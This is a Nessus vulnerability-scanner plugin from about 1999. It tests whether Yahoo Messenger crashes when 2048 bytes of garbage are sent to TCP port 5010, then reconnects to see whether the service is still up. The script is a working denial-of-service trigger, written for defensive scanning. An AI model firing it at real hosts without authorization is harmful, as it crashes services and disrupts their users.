#
# This script was written by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(10326);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CAN-2000-0047");
 
 name["english"] = "Yahoo Messenger Denial of Service attack";
 script_name(english:name["english"]);
 
desc["english"] = "It is possible to cause Yahoo Messenger to crash by sending a few bytes
of garbage into its listening port TCP 5010.

Solution: Block those ports from outside communication

Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "Yahoo Messenger Denial of Service attack";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 SecuriTeam");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(5010);
 
 exit(0);
}

#
# The script code starts here
#

if (get_port_state(5010))
{
 sock5010 = open_sock_tcp(5010);
 if (sock5010)
 {
  send(socket:sock5010, data:crap(2048));
  close(sock5010);

  sock5010_sec = open_sock_tcp(5010);
  if (sock5010_sec)
  {
   security_warning(port:5010, data:"Yahoo Listening port is open.");
  }
  else
  {
   security_hole(5010);
  }
 }
}
